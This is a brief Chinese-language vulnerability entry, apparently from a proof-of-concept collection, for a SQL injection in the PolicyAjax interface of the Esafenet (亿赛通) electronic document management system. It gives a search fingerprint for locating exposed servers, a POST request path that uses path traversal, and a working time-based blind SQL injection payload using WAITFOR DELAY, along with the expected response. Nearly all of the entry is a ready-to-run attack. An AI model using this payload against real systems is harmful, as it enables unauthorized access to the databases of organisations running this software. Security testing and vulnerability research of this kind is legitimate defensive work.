# 亿赛通电子文档管理系统-policyajax接口SQL注入漏洞

亿赛通电子文档管理系统-policyajax接口 ｜ SQL注入 ｜ —
- **指纹**：`app="亿赛通-电子文档安全管理系统"`
- **请求**：`POST /CDGServer3/dojojs/../PolicyAjax HTTP/1.1`

**Payload**
```
command=selectOption&id=-1';WAITFOR DELAY '0:0:6'--&type=JMCL
```
- **响应特征**：200